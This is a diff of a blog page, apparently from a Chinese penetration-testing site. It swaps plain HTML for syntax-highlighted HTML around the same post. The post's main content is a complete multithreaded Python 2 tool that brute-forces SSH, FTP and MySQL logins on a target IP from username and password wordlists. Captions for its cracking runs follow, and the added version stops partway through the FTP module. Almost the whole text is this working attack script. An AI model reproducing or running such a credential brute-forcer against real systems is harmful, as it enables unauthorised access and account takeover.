@@ -82,336 +82,327 @@
     [<a href="/categories/Pentest">Pentest</a>,<a href="/categories/Python">Python</a>](<a href="/tags/python">python</a>,<a href="/tags/%E7%88%86%E7%A0%B4">爆破</a>)
 </div>
 
-      <div>
-
-<h3 id="0x00-脚本">0x00 脚本</h3>
-
-<pre><code class="language-python">#!/usr/bin/env python
-# -*- coding: utf-8 -*-
-
-'this script can bruter ftp/ssh/mysql'
-
-__author__ = 'reber'
-
-import Queue
-import threading
-import time
-import logging
-import socket
-from optparse import OptionParser
-import paramiko
-from ftplib import FTP
-import MySQLdb
-
-#################公有类#################
-class CommonFun(object):
-    &quot;&quot;&quot;docstring for CommonFun&quot;&quot;&quot;
-    def __init__(self):
-        super(CommonFun, self).__init__()
-
-    def set_log(self,lname):
-        logger = logging.getLogger(lname)
-        logger.setLevel(logging.DEBUG)
-
-        ch = logging.StreamHandler()
-        ch.setLevel(logging.DEBUG)
-
-        formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
-        ch.setFormatter(formatter)
-
-        logger.addHandler(ch)
-
-    def show_log(self, lname, msg):
-        a = logging.getLogger(lname)
-        a.debug(msg)
-
-    def show_result(self, lname, rlist):
-        if rlist:
-            print &quot;###################################################################&quot;
-            for x in rlist:
-                self.show_log(lname,x)
-        else:
-            print &quot;not found...&quot;
-
-#################SSH爆破模块#################
-class SshBruter(CommonFun):
-    &quot;&quot;&quot;docstring for SshBruter&quot;&quot;&quot;
-    def __init__(self, *args):
-        super(SshBruter, self).__init__()
-        (options,arg) = args
-        self.host = options.host
-        self.userfile = options.userfile
-        self.passfile = options.passfile
-        self.threadnum = options.threadnum
-        self.timeout = options.timeout
-        self.result = []
-        self.set_log(self.host)
-        self.qlist = Queue.Queue()
-        self.is_exit = False
-        print self.host,self.userfile,self.passfile,self.threadnum
-
-    def get_queue(self):
-        with open(self.userfile, 'r') as f:
-            ulines = f.readlines()
-        with open(self.passfile, 'r') as f:
-            plines = f.readlines()
-
-        for name in ulines:
-            for pwd in plines:
-                name = name.strip()
-                pwd = pwd.strip()
-                self.qlist.put(name + ':' + pwd)
-
-    def thread(self):        
-        while not self.qlist.empty():
-            if not self.is_exit:
-                name,pwd = self.qlist.get().split(':')
-                try:
-                    ssh = paramiko.SSHClient()
-                    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-                    ssh.connect(hostname=self.host,port=22,username=name,password=pwd,timeout=self.timeout)
-                    time.sleep(0.05)
-                    ssh.close()
-                    s = &quot;[OK] %s:%s&quot; % (name,pwd)
-                    self.show_log(self.host,s)
-                    self.result.append(s)
-                except socket.timeout:
-                    self.show_log(self.host,&quot;Timeout...&quot;)
-                    self.qlist.put(name + ':' + pwd)
-                    time.sleep(3)
-                except Exception, e:
-                    error = &quot;[Error] %s:%s&quot; % (name,pwd)
-                    self.show_log(self.host,error)
-                    pass
-            else:
-                break
-
-    def run(self):
-        self.get_queue()
-        starttime = time.time()
-
-        threads = []
-        for x in xrange(1,self.threadnum+1):
-            t = threading.Thread(target=self.thread)
-            threads.append(t)
-            t.setDaemon(True) #主线程完成后不管子线程有没有结束，直接退出
-            t.start()
-
-        try:
-            while True:
-                if self.qlist.empty():
-                    break
-                else:
-                    time.sleep(1)
-        except KeyboardInterrupt:
-            self.is_exit = True
-            print &quot;Exit the program...&quot;
-        print &quot;Waiting...&quot;
-        time.sleep(5)
-
-        self.show_result(self.host,self.result)
-        finishetime = time.time()
-        print &quot;Used time: %f&quot; % (finishetime-starttime)
-
-#################FTP爆破模块#################
-class FtpBruter(CommonFun):
-    &quot;&quot;&quot;docstring for FtpBruter&quot;&quot;&quot;
-    def __init__(self, *args):
-        super(FtpBruter, self).__init__()
-        (options,arg) = args
-        self.host = options.host
-        self.userfile = options.userfile
-        self.passfile = options.passfile
-        self.threadnum = options.threadnum
-        self.timeout = options.timeout
-        self.result = []
-        self.set_log(self.host)
-        self.qlist = Queue.Queue()
-        print self.host,self.userfile,self.passfile,self.threadnum
-
-    def get_queue(self):
-        with open(self.userfile, 'r') as f:
-            ulines = f.readlines()
-        with open(self.passfile, 'r') as f:
-            plines = f.readlines()
-
-        for name in ulines:
-            for pwd in plines:
-                name = name.strip()
-                pwd = pwd.strip()
-                self.qlist.put(name + ':' + pwd)
-
-    def thread(self):
-        while not self.qlist.empty():
-            name,pwd = self.qlist.get().split(':')
-            try:
-                ftp = FTP()
-                ftp.connect(self.host, 21, self.timeout)
-                ftp.login(name, pwd)
-                time.sleep(0.05)
-                ftp.quit()
-                s = &quot;[OK] %s:%s&quot; % (name,pwd)
-                self.show_log(self.host,s)
-                self.result.append(s)
-            except socket.timeout:
-                self.show_log(self.host,&quot;Timeout...&quot;)
-                self.qlist.put(name + ':' + pwd)
-                time.sleep(1)
-            except Exception, e:
-                error = &quot;[Error] %s:%s&quot; % (name,pwd)
-                self.show_log(self.host,error)
-                pass
-
-    def run(self):
-        self.get_queue()
-        starttime = time.time()
-
-        threads = []
-        for x in xrange(1,self.threadnum+1):
-            t = threading.Thread(target=self.thread)
-            threads.append(t)
-            t.setDaemon(True) #主线程完成后不管子线程有没有结束，直接退出
-            t.start()
-
-        try:
-            while True:
-                if self.qlist.empty():
-                    break
-                else:
-                    time.sleep(1)
-        except KeyboardInterrupt:
-            self.is_exit = True
-            print &quot;Exit the program...&quot;
-        print &quot;Waiting...&quot;
-        time.sleep(5)
-
-        self.show_result(self.host,self.result)
-        finishetime = time.time()
-        print &quot;Used time: %f&quot; % (finishetime-starttime)
-
-#################MySQL爆破模块#################
-class MysqlBruter(CommonFun):
-    &quot;&quot;&quot;docstring for MysqlBruter&quot;&quot;&quot;
-    def __init__(self, *args):
-        super(MysqlBruter, self).__init__()
-        (options,arg) = args
-        self.host = options.host
-        self.userfile = options.userfile
-        self.passfile = options.passfile
-        self.threadnum = options.threadnum
-        self.timeout = options.timeout
-        self.result = []
-        self.set_log(self.host)
-        self.qlist = Queue.Queue()
-        print self.host,self.userfile,self.passfile,self.threadnum
-
-    def get_queue(self):
-        with open(self.userfile, 'r') as f:
-            ulines = f.readlines()
-        with open(self.passfile, 'r') as f:
-            plines = f.readlines()
-
-        for name in ulines:
-            for pwd in plines:
-                name = name.strip()
-                pwd = pwd.strip()
-                self.qlist.put(name + ':' + pwd)
-
-    def thread(self):
-        while not self.qlist.empty():
-            name,pwd = self.qlist.get().split(':')
-            try:
-                conn = MySQLdb.connect(host=self.host, user=name, passwd=pwd, db='mysql', port=3306)
-                if conn:
-                    # time.sleep(0.05)
-                    conn.close()
-                s = &quot;[OK] %s:%s&quot; % (name,pwd)
-                self.show_log(self.host,s)
-                self.result.append(s)
-            except socket.timeout:
-                self.show_log(self.host,&quot;Timeout&quot;)
-                self.qlist.put(name + ':' + pwd)
-                time.sleep(3)
-            except Exception, e:
-                error = &quot;[Error] %s:%s&quot; % (name,pwd)
-                self.show_log(self.host,error)
-                pass
-
-    def run(self):
-        self.get_queue()
-        starttime = time.time()
-
-        threads = []
-        for x in xrange(1,self.threadnum+1):
-            t = threading.Thread(target=self.thread)
-            threads.append(t)
-            t.setDaemon(True) #主线程完成后不管子线程有没有结束，直接退出
-            t.start()
-
-        try:
-            while True:
-                if self.qlist.empty():
-                    break
-                else:
-                    time.sleep(1)
-        except KeyboardInterrupt:
-            self.is_exit = True
-            print &quot;Exit the program...&quot;
-        print &quot;Waiting...&quot;
-        time.sleep(5)
-
-        self.show_result(self.host,self.result)
-        finishetime = time.time()
-        print &quot;Used time: %f&quot; % (finishetime-starttime)
-
-def main():
-    parser = OptionParser(usage='Usage: python %prog [options] type')
-    parser.add_option('-i','--host',dest='host',help='target ip')
-    parser.add_option('-o','--timeout',type=int,dest='timeout',default=5,help='timeout')
-    parser.add_option('-t','--thread',type=int,dest='threadnum',default=10,help='threadnum')
-    parser.add_option('-L','--userfile',dest='userfile',default='username.txt',help='userfile')
-    parser.add_option('-P','--passfile',dest='passfile',default='password.txt',help='passfile')
-
-    (options, args) = parser.parse_args()
-
-    if not args:
-        parser.print_help()
-        exit()
-
-    if args[0]=='ssh':
-        if options.host:
-            ssh = SshBruter(options, args)
-            ssh.run()
-        else:
-            parser.print_help()
-    elif args[0]=='ftp':
-        if options.host:
-            ftp = FtpBruter(options, args)
-            ftp.run()
-        else:
-            parser.print_help()
-    elif args[0]=='mysql':
-        if options.host:
-            mysql = MysqlBruter(options, args)
-            mysql.run()
-        else:
-            parser.print_help()
-    else:
-        print &quot;type must be ssh or ftp or mysql&quot;
-
-if __name__ == '__main__':
-    main()
-</code></pre>
-
-<h3 id="0x01-尝试爆破">0x01 尝试爆破</h3>
-
-<p><img src="/img/post/bruter_help.png" alt="帮助信息" /></p>
-
-<p><img src="/img/post/bruter_ssh.png" alt="爆破SSH" /></p>
-
-<p><img src="/img/post/bruter_ftp.png" alt="爆破FTP" /></p>
-
-<p><img src="/img/post/bruter_mysql.png" alt="爆破MySQL" /></p>
+      <div><h3 id="0x00-脚本">0x00 脚本</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># -*- coding: utf-8 -*-</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;this script can bruter ftp/ssh/mysql&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>__author__ <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;reber&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> Queue
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> threading
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> time
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> logging
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> socket
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> optparse <span style="color:#f92672">import</span> OptionParser
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> paramiko
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> ftplib <span style="color:#f92672">import</span> FTP
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> MySQLdb
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#################公有类#################</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">CommonFun</span>(object):
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;&#34;&#34;docstring for CommonFun&#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> __init__(self):
+</span></span><span style="display:flex;"><span>        super(CommonFun, self)<span style="color:#f92672">.</span>__init__()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">set_log</span>(self,lname):
+</span></span><span style="display:flex;"><span>        logger <span style="color:#f92672">=</span> logging<span style="color:#f92672">.</span>getLogger(lname)
+</span></span><span style="display:flex;"><span>        logger<span style="color:#f92672">.</span>setLevel(logging<span style="color:#f92672">.</span>DEBUG)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        ch <span style="color:#f92672">=</span> logging<span style="color:#f92672">.</span>StreamHandler()
+</span></span><span style="display:flex;"><span>        ch<span style="color:#f92672">.</span>setLevel(logging<span style="color:#f92672">.</span>DEBUG)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        formatter <span style="color:#f92672">=</span> logging<span style="color:#f92672">.</span>Formatter(<span style="color:#e6db74">&#39;</span><span style="color:#e6db74">%(asctime)s</span><span style="color:#e6db74"> - </span><span style="color:#e6db74">%(name)s</span><span style="color:#e6db74"> - </span><span style="color:#e6db74">%(levelname)s</span><span style="color:#e6db74"> - </span><span style="color:#e6db74">%(message)s</span><span style="color:#e6db74">&#39;</span>)
+</span></span><span style="display:flex;"><span>        ch<span style="color:#f92672">.</span>setFormatter(formatter)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        logger<span style="color:#f92672">.</span>addHandler(ch)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">show_log</span>(self, lname, msg):
+</span></span><span style="display:flex;"><span>        a <span style="color:#f92672">=</span> logging<span style="color:#f92672">.</span>getLogger(lname)
+</span></span><span style="display:flex;"><span>        a<span style="color:#f92672">.</span>debug(msg)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">show_result</span>(self, lname, rlist):
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> rlist:
+</span></span><span style="display:flex;"><span>            print <span style="color:#e6db74">&#34;###################################################################&#34;</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> rlist:
+</span></span><span style="display:flex;"><span>                self<span style="color:#f92672">.</span>show_log(lname,x)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>            print <span style="color:#e6db74">&#34;not found...&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#################SSH爆破模块#################</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">SshBruter</span>(CommonFun):
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;&#34;&#34;docstring for SshBruter&#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> __init__(self, <span style="color:#f92672">*</span>args):
+</span></span><span style="display:flex;"><span>        super(SshBruter, self)<span style="color:#f92672">.</span>__init__()
+</span></span><span style="display:flex;"><span>        (options,arg) <span style="color:#f92672">=</span> args
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>host <span style="color:#f92672">=</span> options<span style="color:#f92672">.</span>host
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>userfile <span style="color:#f92672">=</span> options<span style="color:#f92672">.</span>userfile
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>passfile <span style="color:#f92672">=</span> options<span style="color:#f92672">.</span>passfile
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>threadnum <span style="color:#f92672">=</span> options<span style="color:#f92672">.</span>threadnum
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>timeout <span style="color:#f92672">=</span> options<span style="color:#f92672">.</span>timeout
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>result <span style="color:#f92672">=</span> []
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>set_log(self<span style="color:#f92672">.</span>host)
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>qlist <span style="color:#f92672">=</span> Queue<span style="color:#f92672">.</span>Queue()
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>is_exit <span style="color:#f92672">=</span> <span style="color:#66d9ef">False</span>
+</span></span><span style="display:flex;"><span>        print self<span style="color:#f92672">.</span>host,self<span style="color:#f92672">.</span>userfile,self<span style="color:#f92672">.</span>passfile,self<span style="color:#f92672">.</span>threadnum
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_queue</span>(self):
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">with</span> open(self<span style="color:#f92672">.</span>userfile, <span style="color:#e6db74">&#39;r&#39;</span>) <span style="color:#66d9ef">as</span> f:
+</span></span><span style="display:flex;"><span>            ulines <span style="color:#f92672">=</span> f<span style="color:#f92672">.</span>readlines()
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">with</span> open(self<span style="color:#f92672">.</span>passfile, <span style="color:#e6db74">&#39;r&#39;</span>) <span style="color:#66d9ef">as</span> f:
+</span></span><span style="display:flex;"><span>            plines <span style="color:#f92672">=</span> f<span style="color:#f92672">.</span>readlines()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> name <span style="color:#f92672">in</span> ulines:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">for</span> pwd <span style="color:#f92672">in</span> plines:
+</span></span><span style="display:flex;"><span>                name <span style="color:#f92672">=</span> name<span style="color:#f92672">.</span>strip()
+</span></span><span style="display:flex;"><span>                pwd <span style="color:#f92672">=</span> pwd<span style="color:#f92672">.</span>strip()
+</span></span><span style="display:flex;"><span>                self<span style="color:#f92672">.</span>qlist<span style="color:#f92672">.</span>put(name <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;:&#39;</span> <span style="color:#f92672">+</span> pwd)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">thread</span>(self):        
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">while</span> <span style="color:#f92672">not</span> self<span style="color:#f92672">.</span>qlist<span style="color:#f92672">.</span>empty():
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> self<span style="color:#f92672">.</span>is_exit:
+</span></span><span style="display:flex;"><span>                name,pwd <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>qlist<span style="color:#f92672">.</span>get()<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;:&#39;</span>)
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>                    ssh <span style="color:#f92672">=</span> paramiko<span style="color:#f92672">.</span>SSHClient()
+</span></span><span style="display:flex;"><span>                    ssh<span style="color:#f92672">.</span>set_missing_host_key_policy(paramiko<span style="color:#f92672">.</span>AutoAddPolicy())
+</span></span><span style="display:flex;"><span>                    ssh<span style="color:#f92672">.</span>connect(hostname<span style="color:#f92672">=</span>self<span style="color:#f92672">.</span>host,port<span style="color:#f92672">=</span><span style="color:#ae81ff">22</span>,username<span style="color:#f92672">=</span>name,password<span style="color:#f92672">=</span>pwd,timeout<span style="color:#f92672">=</span>self<span style="color:#f92672">.</span>timeout)
+</span></span><span style="display:flex;"><span>                    time<span style="color:#f92672">.</span>sleep(<span style="color:#ae81ff">0.05</span>)
+</span></span><span style="display:flex;"><span>                    ssh<span style="color:#f92672">.</span>close()
+</span></span><span style="display:flex;"><span>                    s <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;[OK] </span><span style="color:#e6db74">%s</span><span style="color:#e6db74">:</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> (name,pwd)
+</span></span><span style="display:flex;"><span>                    self<span style="color:#f92672">.</span>show_log(self<span style="color:#f92672">.</span>host,s)
+</span></span><span style="display:flex;"><span>                    self<span style="color:#f92672">.</span>result<span style="color:#f92672">.</span>append(s)
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">except</span> socket<span style="color:#f92672">.</span>timeout:
+</span></span><span style="display:flex;"><span>                    self<span style="color:#f92672">.</span>show_log(self<span style="color:#f92672">.</span>host,<span style="color:#e6db74">&#34;Timeout...&#34;</span>)
+</span></span><span style="display:flex;"><span>                    self<span style="color:#f92672">.</span>qlist<span style="color:#f92672">.</span>put(name <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;:&#39;</span> <span style="color:#f92672">+</span> pwd)
+</span></span><span style="display:flex;"><span>                    time<span style="color:#f92672">.</span>sleep(<span style="color:#ae81ff">3</span>)
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span>, e:
+</span></span><span style="display:flex;"><span>                    error <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;[Error] </span><span style="color:#e6db74">%s</span><span style="color:#e6db74">:</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> (name,pwd)
+</span></span><span style="display:flex;"><span>                    self<span style="color:#f92672">.</span>show_log(self<span style="color:#f92672">.</span>host,error)
+</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">pass</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">break</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">run</span>(self):
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>get_queue()
+</span></span><span style="display:flex;"><span>        starttime <span style="color:#f92672">=</span> time<span style="color:#f92672">.</span>time()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        threads <span style="color:#f92672">=</span> []
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> xrange(<span style="color:#ae81ff">1</span>,self<span style="color:#f92672">.</span>threadnum<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>):
+</span></span><span style="display:flex;"><span>            t <span style="color:#f92672">=</span> threading<span style="color:#f92672">.</span>Thread(target<span style="color:#f92672">=</span>self<span style="color:#f92672">.</span>thread)
+</span></span><span style="display:flex;"><span>            threads<span style="color:#f92672">.</span>append(t)
+</span></span><span style="display:flex;"><span>            t<span style="color:#f92672">.</span>setDaemon(<span style="color:#66d9ef">True</span>) <span style="color:#75715e">#主线程完成后不管子线程有没有结束，直接退出</span>
+</span></span><span style="display:flex;"><span>            t<span style="color:#f92672">.</span>start()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">while</span> <span style="color:#66d9ef">True</span>:
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> self<span style="color:#f92672">.</span>qlist<span style="color:#f92672">.</span>empty():
+</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">break</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>                    time<span style="color:#f92672">.</span>sleep(<span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">KeyboardInterrupt</span>:
+</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>is_exit <span style="color:#f92672">=</span> <span style="color:#66d9ef">True</span>
+</span></span><span style="display:flex;"><span>            print <span style="color:#e6db74">&#34;Exit the program...&#34;</span>
+</span></span><span style="display:flex;"><span>        print <span style="color:#e6db74">&#34;Waiting...&#34;</span>
+</span></span><span style="display:flex;"><span>        time<span style="color:#f92672">.</span>sleep(<span style="color:#ae81ff">5</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>show_result(self<span style="color:#f92672">.</span>host,self<span style="color:#f92672">.</span>result)
+</span></span><span style="display:flex;"><span>        finishetime <span style="color:#f92672">=</span> time<span style="color:#f92672">.</span>time()
+</span></span><span style="display:flex;"><span>        print <span style="color:#e6db74">&#34;Used time: </span><span style="color:#e6db74">%f</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> (finishetime<span style="color:#f92672">-</span>starttime)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#################FTP爆破模块#################</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">FtpBruter</span>(CommonFun):
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;&#34;&#34;docstring for FtpBruter&#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> __init__(self, <span style="color:#f92672">*</span>args):
+</span></span><span style="display:flex;"><span>        super(FtpBruter, self)<span style="color:#f92672">.</span>__init__()
+</span></span><span style="display:flex;"><span>        (options,arg) <span style="color:#f92672">=</span> args
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>host <span style="color:#f92672">=</span> options<span style="color:#f92672">.</span>host
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>userfile <span style="color:#f92672">=</span> options<span style="color:#f92672">.</span>userfile
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>passfile <span style="color:#f92672">=</span> options<span style="color:#f92672">.</span>passfile
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>threadnum <span style="color:#f92672">=</span> options<span style="color:#f92672">.</span>threadnum
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>timeout <span style="color:#f92672">=</span> options<span style="color:#f92672">.</span>timeout
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>result <span style="color:#f92672">=</span> []
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>set_log(self<span style="color:#f92672">.</span>host)
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>qlist <span style="color:#f92672">=</span> Queue<span style="color:#f92672">.</span>Queue()
+</span></span><span style="display:flex;"><span>        print self<span style="color:#f92672">.</span>host,self<span style="color:#f92672">.</span>userfile,self<span style="color:#f92672">.</span>passfile,self<span style="color:#f92672">.</span>threadnum
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_queue</span>(self):
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">with</span> open(self<span style="color:#f92672">.</span>userfile, <span style="color:#e6db74">&#39;r&#39;</span>) <span style="color:#66d9ef">as</span> f:
+</span></span><span style="display:flex;"><span>            ulines <span style="color:#f92672">=</span> f<span style="color:#f92672">.</span>readlines()
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">with</span> open(self<span style="color:#f92672">.</span>passfile, <span style="color:#e6db74">&#39;r&#39;</span>) <span style="color:#66d9ef">as</span> f:
+</span></span><span style="display:flex;"><span>            plines <span style="color:#f92672">=</span> f<span style="color:#f92672">.</span>readlines()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> name <span style="color:#f92672">in</span> ulines:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">for</span> pwd <span style="color:#f92672">in</span> plines:
+</span></span><span style="display:flex;"><span>                name <span style="color:#f92672">=</span> name<span style="color:#f92672">.</span>strip()
+</span></span><span style="display:flex;"><span>                pwd <span style="color:#f92672">=</span> pwd<span style="color:#f92672">.</span>strip()
+</span></span><span style="display:flex;"><span>                self<span style="color:#f92672">.</span>qlist<span style="color:#f92672">.</span>put(name <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;:&#39;</span> <span style="color:#f92672">+</span> pwd)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">thread</span>(self):
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">while</span> <span style="color:#f92672">not</span> self<span style="color:#f92672">.</span>qlist<span style="color:#f92672">.</span>empty():
+</span></span><span style="display:flex;"><span>            name,pwd <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>qlist<span style="color:#f92672">.</span>get()<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;:&#39;</span>)
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>                ftp <span style="color:#f92672">=</span> FTP()
+</span></span><span style="display:flex;"><span>                ftp<span style="color:#f92672">.</span>connect(self<span style="color:#f92672">.</span>host, <span style="color:#ae81ff">21</span>, self<span style="color:#f92672">.</span>timeout)
+</span></span><span style="display:flex;"><span>                ftp<span style="color:#f92672">.</span>login(name, pwd)
+</span></span><span style="display:flex;"><span>                time<span style="color:#f92672">.</span>sleep(<span style="color:#ae81ff">0.05</span>)
+</span></span><span style="display:flex;"><span>                ftp<span style="color:#f92672">.</span>quit()
+</span></span><span style="display:flex;"><span>                s <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;[OK] </span><span style="color:#e6db74">%s</span><span style="color:#e6db74">:</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> (name,pwd)
+</span></span><span style="display:flex;"><span>                self<span style="color:#f92672">.</span>show_log(self<span style="color:#f92672">.</span>host,s)
+</span></span><span style="display:flex;"><span>                self<span style="color:#f92672">.</span>result<span style="color:#f92672">.</span>append(s)
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">except</span> socket<span style="color:#f92672">.</span>timeout:
+</span></span><span style="display:flex;"><span>                self<span style="color:#f92672">.</span>show_log(self<span style="color:#f92672">.</span>host,<span style="color:#e6db74">&#34;Timeout...&#34;</span>)
+</span></span><span style="display:flex;"><span>                self<span style="color:#f92672">.</span>qlist<span style="color:#f92672">.</span>put(name <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;:&#39;</span> <span style="color:#f92672">+</span> pwd)
+</span></span><span style="display:flex;"><span>                time<span style="color:#f92672">.</span>sleep(<span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span>, e:
